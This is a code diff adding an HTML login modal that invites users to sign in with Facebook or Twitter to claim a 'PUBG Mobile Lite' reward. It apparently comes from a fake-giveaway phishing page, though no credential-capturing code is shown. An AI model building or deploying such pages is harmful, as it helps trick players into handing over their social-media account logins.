@@ -1,0 +1,90 @@
+<div
+        x-show="$store.pubg_store.login_open"
+        class="
+          login_overlay
+          z-10
+          fixed
+          top-0
+          left-0
+          bottom-0
+          right-0
+          flex
+          justify-center
+          items-center
+          h-screen
+          w-full
+          bg-black bg-opacity-30
+          px-3
+        "
+      >
+        <div class="login_modal w-full md:w-96 z-30 bg-white rounded-md">
+          <div
+            class="
+              login_header
+              flex
+              justify-between
+              items-center
+              px-3
+              py-2
+              border-b-2 border-black
+            "
+          >
+            <h1 class="text-xl">Account Login</h1>
+            <button class="text-3xl" @click="login_close()">&times;</button>
+          </div>
+          <div class="login_body p-2">
+            <div
+              class="
+                login_title
+                mb-3
+                bg-black
+                sm:text-md
+                text-sm text-center text-yellow-500
+                capitalize
+                rounded-md
+                py-2
+              "
+            >
+              Login to <span class="uppercase">pubg mobile</span> light to
+              correct reward
+            </div>
+            <div
+              @click="facebook_open()"
+              class="
+                login_facebook
+                cursor-pointer
+                flex
+                items-center
+                mb-1.5
+                bg-blue-900
+                sm:text-base
+                text-sm text-center text-white
+                capitalize
+                rounded-md
+                py-1
+              "
+            >
+              <i class="fab ml-4 fa-facebook-f text-xl"></i>
+              <h1 class="mx-auto text-md">Log in Using Facebook account</h1>
+            </div>
+            <div
+              @click="twitter_open()"
+              class="
+                login_twitter
+                cursor-pointer
+                flex
+                items-center
+                bg-blue-600
+                sm:text-base
+                text-sm text-center text-white
+                capitalize
+                rounded-md
+                py-1
+              "
+            >
+              <i class="fab ml-4 fa-twitter text-xl"></i>
+              <h1 class="mx-auto text-md">Log in Using Twitter account</h1>
+            </div>
+          </div>
+        </div>
+      </div>
